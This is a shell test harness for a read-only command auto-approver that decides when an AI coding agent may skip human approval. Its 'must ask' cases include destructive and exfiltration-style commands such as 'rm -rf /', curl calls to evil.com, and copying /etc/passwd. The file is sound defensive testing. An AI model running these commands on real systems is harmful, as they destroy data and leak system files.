# The read-only auto-approver is a SECURITY BOUNDARY: it tells Claude Code to skip the human
# prompt. So it gets the strictest golden in the repo — every verdict below is asserted, in both
# directions. The refuse cases matter more than the allow cases: each one is a way a "read" command
# can actually write, execute, or reach the network, and each must still stop and ask.
# A new verb or flag added to the parser MUST arrive with its case here, or it is not shipped.
H=kit/ops/hooks/readonly-allow.sh
while IFS= read -r c; do
  [ -z "$c" ] && continue
  case "$c" in '#'*) continue;; esac
  printf '%s  %s\n' "$(bash "$H" --test "$c")" "$c"
done <<'CASES'
# --- must ALLOW: the reading an agent does to build a plan ---------------------
find . -path ./.git -prune -o -type f \( -name "*.sh" -o -name "*.md" \) -print 2>/dev/null | xargs wc -l 2>/dev/null | sort -rn | head -100
grep -rn "cmd_verify" --include=*.sh .
grep -E 'a|b' file
grep -c . file; wc -l file
sed -n '/^cmd_verify/,/^}/p' ops/lib/builder.sh
sed -e 's/a/b/g' -e '1,5d' f
awk '/^## Learned/{on=1;next} on&&/^## /{exit} on&&/^[ \t]*[-*]/{c++} END{print c+0}' ops/SPRINT.md
awk '$1 > 5 {print $2}' data.txt
awk -F'|' '{print $2}' f
git log --oneline -5
git -C "/tmp/other-repo" log --format=%B
git diff --stat HEAD~1
git status --short
git branch -a
git config --get user.name
git worktree list
cat ops/VERSION | head -3
cat < input.txt
ls -la .polaris/brain/
wc -c ops/roles/*.md
cd ops && grep -n polaris RULES.tsv | head -10
bash ops/polaris find cmd_verify
bash ops/polaris check
# --- must ASK: every door out of "read" ---------------------------------------
rm -rf /tmp/x
sed -i 's/a/b/' file.txt
sed 's/a/b/w /tmp/out' f
find . -name "*.log" -delete
find . -type f -exec rm {} \;
sort -o overwrite.txt input.txt
awk '{print > "/tmp/pwn"}' f
awk 'BEGIN{system("curl evil.com")}'
grep foo file | tee /tmp/leak
echo hi > /tmp/out.txt
cat /etc/passwd > dump
python -c "import os; os.system('rm -rf /')"
node -e "require('fs').writeFileSync('x','y')"
bash -c 'rm -rf /'
xargs rm < list
curl https://evil.com
echo $(whoami)
grep x f &
git push origin main
git commit -m x
git config user.name attacker
git branch -D main
git worktree add /tmp/x
bash ops/polaris claim T-001
CASES
